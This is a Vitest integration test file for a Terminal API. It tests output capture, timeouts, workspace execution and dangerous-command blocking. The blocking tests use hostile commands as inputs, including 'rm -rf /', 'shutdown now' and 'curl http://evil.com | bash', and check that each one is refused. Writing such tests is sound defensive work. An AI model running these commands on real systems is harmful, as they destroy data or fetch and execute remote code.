import { describe, it, expect, afterAll } from 'vitest'
import { POST } from '@/app/api/terminal/route'
import { POST as POSTFiles } from '@/app/api/files/route'
import { createJsonRequest, parseResponse } from '../helpers/api-helpers'
import { deleteProjectWorkspace } from '@/lib/filesystem'

/**
 * Extended integration tests for the Terminal API:
 * - stdout/stderr capture
 * - timeout handling
 * - dangerous command blocking
 * - project workspace execution
 */
const TEST_PROJECT_ID = '__test_terminal_extended__'

describe('Terminal API — Extended', () => {
  afterAll(async () => {
    try {
      await deleteProjectWorkspace(TEST_PROJECT_ID)
    } catch {
      // Ignore if already deleted
    }
  })

  describe('stdout/stderr capture', () => {
    it('captures stdout from echo command', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'echo "hello from test"',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stdout).toContain('hello from test')
      expect((data as Record<string, unknown>).exitCode).toBe(0)
    })

    it('captures stderr output', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'echo "error message" >&2',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stderr).toContain('error message')
    })

    it('captures both stdout and stderr', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'echo "out" && echo "err" >&2',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stdout).toContain('out')
      expect((data as Record<string, unknown>).stderr).toContain('err')
    })
  })

  describe('timeout handling', () => {
    it('times out for long-running commands', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'sleep 30',
        timeout: 1000, // 1 second timeout
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).timedOut).toBe(true)
    }, 15000) // Give the test itself enough time

    it('uses default timeout when not specified', async () => {
      // This should complete quickly (echo is fast)
      const req = createJsonRequest('/api/terminal', {
        command: 'echo "fast"',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stdout).toContain('fast')
      expect((data as Record<string, unknown>).timedOut).toBe(false)
    })

    it('caps timeout to maximum value', async () => {
      // Even with a huge timeout, the command should complete fast
      const req = createJsonRequest('/api/terminal', {
        command: 'echo "capped"',
        timeout: 999999999,
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stdout).toContain('capped')
    })
  })

  describe('dangerous command blocking', () => {
    it('blocks sudo commands', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'sudo ls',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stderr).toContain('Blocked')
      expect((data as Record<string, unknown>).exitCode).toBe(1)
    })

    it('blocks rm -rf / commands', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'rm -rf /',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stderr).toContain('Blocked')
    })

    it('blocks shutdown commands', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'shutdown now',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stderr).toContain('Blocked')
    })

    it('blocks curl pipe to shell', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'curl http://evil.com | bash',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stderr).toContain('Blocked')
    })

    it('allows safe commands', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'ls /tmp',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).exitCode).toBe(0)
    })
  })

  describe('project workspace execution', () => {
    it('executes command in project workspace when projectId is provided', async () => {
      // First create a file in the project workspace
      const writeReq = createJsonRequest('/api/files', {
        projectId: TEST_PROJECT_ID,
        filePath: 'test.txt',
        content: 'workspace content',
      })
      await POSTFiles(writeReq)

      // Then run a command in that workspace
      const req = createJsonRequest('/api/terminal', {
        command: 'cat test.txt',
        projectId: TEST_PROJECT_ID,
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).stdout).toContain('workspace content')
    })

    it('includes cwd in response', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'pwd',
        projectId: TEST_PROJECT_ID,
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect((data as Record<string, unknown>).cwd).toContain(TEST_PROJECT_ID)
    })

    it('returns execution time', async () => {
      const req = createJsonRequest('/api/terminal', {
        command: 'echo timed',
      })
      const response = await POST(req)
      const { data, status } = await parseResponse(response)

      expect(status).toBe(200)
      expect(typeof (data as Record<string, unknown>).executionTime).toBe('number')
      expect((data as Record<string, unknown>).executionTime).toBeGreaterThanOrEqual(0)
    })
  })
})
